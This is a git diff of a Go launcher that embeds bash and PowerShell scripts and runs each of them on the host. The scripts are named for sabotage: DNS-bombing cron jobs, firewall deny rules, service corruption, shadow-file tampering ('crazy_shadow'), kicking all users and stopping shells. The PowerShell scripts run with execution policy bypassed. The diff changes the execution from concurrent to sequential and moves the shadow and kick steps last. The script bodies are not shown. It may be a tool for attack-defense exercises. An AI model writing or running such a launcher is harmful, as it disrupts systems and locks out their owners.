@@ -2,11 +2,12 @@ package main
 
 import (
     _ "embed"
-    "sync"
+    // "sync"
     "os/exec"
     "bytes"
     "os"
     "path/filepath"
+    "log"
 )
 
 // Linux scripts
@@ -83,15 +84,33 @@ var service_corrupt_ps1 []byte
 //go:embed scripts/service_corrupt_task.ps1
 var service_corrupt_task_ps1 []byte
 
-func run_bash(script []byte, wg *sync.WaitGroup) {
-    defer wg.Done()
+// func run_bash(script []byte, wg *sync.WaitGroup) {
+//     defer wg.Done()
+//     cmd := exec.Command("bash")
+//     cmd.Stdin = bytes.NewReader(script)
+//     cmd.Run()
+// }
+
+// func run_ps1(script []byte, wg *sync.WaitGroup) {
+//     defer wg.Done()
+//     tmp, err := os.CreateTemp("", "*.ps1")
+//     if err != nil {
+//         return
+//     }
+//     defer os.Remove(tmp.Name())
+//     tmp.Write(script)
+//     tmp.Close()
+//     cmd := exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-File", filepath.Clean(tmp.Name()))
+//     cmd.Run()
+// }
+
+func run_bash(script []byte) {
     cmd := exec.Command("bash")
     cmd.Stdin = bytes.NewReader(script)
     cmd.Run()
 }
 
-func run_ps1(script []byte, wg *sync.WaitGroup) {
-    defer wg.Done()
+func run_ps1(script []byte) {
     tmp, err := os.CreateTemp("", "*.ps1")
     if err != nil {
         return
@@ -104,7 +123,7 @@ func run_ps1(script []byte, wg *sync.WaitGroup) {
 }
 
 func main() {
-    var wg sync.WaitGroup
+    // var wg sync.WaitGroup
 
     bash_scripts := [][]byte{
         cron_dns_bomb,
@@ -113,9 +132,7 @@ func main() {
         firewall_deny_sh,
         firewall_deny_cron,
         firewall_deny_systemd,
-        crazy_shadow_sh,
         prompt_space_sh,
-        kick_all,
         prompt_space_cron,
         prompt_space_systemd,
         service_corrupt_sh,
@@ -123,6 +140,8 @@ func main() {
         service_corrupt_sysd,
         stop_shell_switch1,
         stop_shell_switch2,
+        crazy_shadow_sh,
+        kick_all,
     }
 
     ps1_scripts := [][]byte{
@@ -136,16 +155,24 @@ func main() {
         service_corrupt_task_ps1,
     }
 
+    // for _, s := range bash_scripts {
+    //     wg.Add(1)
+    //     go run_bash(s, &wg)
+    // }
+    // for _, s := range ps1_scripts {
+    //     wg.Add(1)
+    //     go run_ps1(s, &wg)
+    // }
+
+    // wg.Wait()
+
     for _, s := range bash_scripts {
-        wg.Add(1)
-        go run_bash(s, &wg)
+        log.Printf("running bash")
+        run_bash(s)
     }
     for _, s := range ps1_scripts {
-        wg.Add(1)
-        go run_ps1(s, &wg)
+        run_ps1(s)
     }
-
-    wg.Wait()
 
     // shadow and kick run sequentially after everything else finishes
     // shadow := exec.Command("bash")
